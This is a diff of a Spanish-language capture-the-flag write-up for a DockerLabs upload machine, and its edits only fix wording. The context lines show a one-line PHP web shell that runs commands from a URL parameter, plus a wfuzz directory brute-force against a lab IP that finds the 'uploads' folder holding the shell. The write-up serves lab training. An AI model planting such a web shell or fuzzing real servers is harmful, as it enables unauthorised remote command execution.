@@ -37,9 +37,9 @@ Al tener la oportunidad de subir archivos a una web, en lo primero que pensariam
 echo "<?php system(\$_GET['cmd']); ?>" >> test.php
 ```
 
-Despues de crear el archivo lo subiremos a la servidor. Y ahora tenemos que encontrar la ruta en donde ha sido guardado nuestro archivo.
+Despues de crear el archivo lo subiremos al servidor. Ahora debemos encontrar la ruta en donde ha sido guardado nuestro archivo.
 
-Para ello, haremos uso de wfuzz para buscar esa ruta o directorio en donde deberia estar nuestro archivo test.php.
+Para ello, haremos uso de wfuzz para encontrar esa ruta en donde ha sido guardado nuestro archivo.
 
 ```shell
 wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt http://172.17.0.2/FUZZ
@@ -59,7 +59,7 @@ ID           Response   Lines    Word       Chars       Payload
 000000164:   301        9 L      28 W       310 Ch      "uploads"
 ```
 
-Si revisamos el directorio que nos ha econtrado llamado "uploads", podremos oberservar que ahi se encuntra alojado nuestro archivo test.php.
+Si revisamos el directorio que nos ha econtrado wfuzz llamado "uploads", podremos oberservar que ahi se encuntra alojado nuestro archivo test.php.
 
 ![image](https://github.com/Crisstianpd/CTFs/blob/c7607027a54663a493ee8f98bae0e294bba35842/DockerLabs/Easy/Upload/imgs/upload-img2.png)
 
